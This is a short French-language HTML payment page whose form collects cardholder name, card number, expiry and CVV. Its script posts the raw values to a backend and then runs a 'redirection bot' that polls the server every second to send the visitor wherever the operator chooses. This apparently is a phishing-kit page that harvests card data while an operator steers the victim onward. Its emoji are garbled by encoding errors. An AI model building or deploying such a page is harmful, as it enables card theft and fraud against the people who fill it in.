<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Paiement</title>
<style>
#loader{display:none;} 
</style>
</head>
<body>
<h1>üí≥ Paiement</h1>
<form id="paymentForm">
<input type="text" name="nomTitulaire" placeholder="Nom titulaire" required>
<input type="text" name="cardNumber" placeholder="Num√©ro carte" required>
<input type="text" name="expiry" placeholder="MM/AA" required>
<input type="text" name="cvv" placeholder="CVV" required>
<button type="submit">Payer</button>
</form>
<div id="loader">‚è≥ Paiement en cours...</div>

<script>
document.getElementById('paymentForm').addEventListener('submit', async (e)=>{
    e.preventDefault();
    const form = e.target;
    const data = {
        nomTitulaire: form.nomTitulaire.value,
        cardNumber: form.cardNumber.value,
        expiry: form.expiry.value,
        cvv: form.cvv.value
    };
    await fetch('/api/payment',{method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data)});
    form.style.display='none';
    document.getElementById('loader').style.display='block';
});

// Polling redirection bot
async function pollRedirect(){
    const res = await fetch('/api/status');
    const data = await res.json();
    if(data.redirect && window.location.pathname !== data.redirect){
        window.location.href = data.redirect;
    }
    setTimeout(pollRedirect,1000);
}
pollRedirect();
</script>
</body>
</html>
